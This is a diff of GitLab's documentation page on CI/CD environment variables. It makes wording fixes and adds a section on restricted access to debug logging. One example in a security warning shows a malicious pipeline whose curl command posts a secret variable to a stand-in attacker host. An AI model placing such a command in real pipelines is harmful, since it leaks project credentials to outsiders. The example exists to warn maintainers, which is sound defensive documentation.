@@ -1,7 +1,7 @@
 ---
 stage: Verify
 group: Continuous Integration
-info: To determine the technical writer assigned to the Stage/Group associated with this page, see https://about.gitlab.com/handbook/engineering/ux/technical-writing/#designated-technical-writers
+info: To determine the technical writer assigned to the Stage/Group associated with this page, see https://about.gitlab.com/handbook/engineering/ux/technical-writing/#assignments
 type: reference
 ---
 
@@ -142,7 +142,7 @@ Here is a simplified example of a malicious `.gitlab-ci.yml`:
 ```yaml
 build:
   script:
-    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" https://maliciouswebsite.abcd/
+    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
 ```
 
 ### Custom environment variables of type Variable
@@ -243,7 +243,7 @@ Some variables are listed in the UI so you can choose them more quickly.
 | `AWS_DEFAULT_REGION`    | Any                                                | 12.10         |
 | `AWS_SECRET_ACCESS_KEY` | Any                                                | 12.10         |
 
-CAUTION: **Caution:**
+WARNING:
 When you store credentials, there are security implications. If you are using AWS keys,
 for example, follow their [best practices](https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html).
 
@@ -259,7 +259,7 @@ To access environment variables, use the syntax for your runner's [shell](https:
 |----------------------|------------------------------------------|
 | bash/sh              | `$variable`                              |
 | PowerShell           | `$env:variable` (primary) or `$variable` |
-| Windows Batch        | `%variable%`                             |
+| Windows Batch        | `%variable%`, or `!variable!` for [delayed expansion](https://ss64.com/nt/delayedexpansion.html), which can be used for variables that contain white spaces or newlines. |
 
 ### Bash
 
@@ -415,7 +415,7 @@ You can define per-project or per-group variables that are set in the pipeline e
 We recommend using group environment variables to store secrets (like passwords, SSH keys, and credentials) for Premium users who:
 
 - Do **not** use an external key store.
-- Use GitLab's [integration with HashiCorp Vault](../secrets/index.md).
+- Use the GitLab [integration with HashiCorp Vault](../secrets/index.md).
 
 Group-level variables can be added by:
 
@@ -442,7 +442,7 @@ You can define instance-level variables via the UI or [API](../../api/instance_l
 
 To add an instance-level variable:
 
-1. Navigate to your admin area's **Settings > CI/CD** and expand the **Variables** section.
+1. Navigate to your Admin Area's **Settings > CI/CD** and expand the **Variables** section.
 1. Click the **Add variable** button, and fill in the details:
 
    - **Key**: Must be one line, using only letters, numbers, or `_` (underscore), with no spaces.
@@ -590,7 +590,7 @@ variables](../../topics/autodevops/customize.md#application-secret-variables) ar
 then available as environment variables on the running application
 container.
 
-CAUTION: **Caution:**
+WARNING:
 Variables with multi-line values are not supported due to
 limitations with the Auto DevOps scripting environment.
 
@@ -798,7 +798,7 @@ deploy_staging:
     - if: '$RELEASE =~ $STAGINGRELS'
 ```
 
-NOTE: **Note:**
+NOTE:
 The available regular expression syntax is limited. See [related issue](https://gitlab.com/gitlab-org/gitlab/-/issues/35438)
 for more details.
 
@@ -825,7 +825,7 @@ testvariable:
 
 > Introduced in GitLab Runner 1.7.
 
-CAUTION: **Warning:**
+WARNING:
 Enabling debug tracing can have severe security implications. The
 output **will** contain the content of all your variables and any other
 secrets! The output **will** be uploaded to the GitLab server and made visible
@@ -843,6 +843,50 @@ Before enabling this, you should ensure jobs are visible to
 [team members only](../../user/permissions.md#project-features). You should
 also [erase](../jobs/index.md#view-jobs-in-a-pipeline) all generated job logs
 before making them visible again.
+
+### Restricted access to debug logging
+
+> - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/213159) in GitLab 13.7.
+> - It's [deployed behind a feature flag](../../user/feature_flags.md), enabled by default.
+> - It's enabled on GitLab.com.
+> - It's recommended for production use.
+> - For GitLab self-managed instances, GitLab administrators can opt to [disable it](#enable-or-disable-restricted-access-to-debug-logging). **(CORE ONLY)**
+
+WARNING:
+This feature might not be available to you. Check the **version history** note above for details.
+
+With restricted access to debug logging, only users with
+[developer or higher permissions](../../user/permissions.md#project-members-permissions)
+can view job logs when debug logging is enabled with a variable in:
+
+- The [`.gitlab-ci.yml` file](#gitlab-ciyml-defined-variables).
+- The CI/CD variables set within the GitLab UI.
+
+WARNING:
+If you add `CI_DEBUG_TRACE` as a local variable to your runners, debug logs are visible
+to all users with access to job logs. The permission levels are not checked by Runner,
+so you should make use of the variable in GitLab only.
+
+#### Enable or disable Restricted access to debug logging **(CORE ONLY)**
+
+Restricted Access to Debug logging is under development but ready for production use.
+It is deployed behind a feature flag that is **enabled by default**.
+[GitLab administrators with access to the GitLab Rails console](../../administration/feature_flags.md)
+can opt to disable it.
+
+To enable it:
+
+```ruby
+Feature.enable(:restrict_access_to_build_debug_mode)
+```
+
+To disable it:
+
+```ruby
+Feature.disable(:restrict_access_to_build_debug_mode)
+```
+
+### Enable Debug logging
 
 To enable debug logs (traces), set the `CI_DEBUG_TRACE` variable to `true`:
 
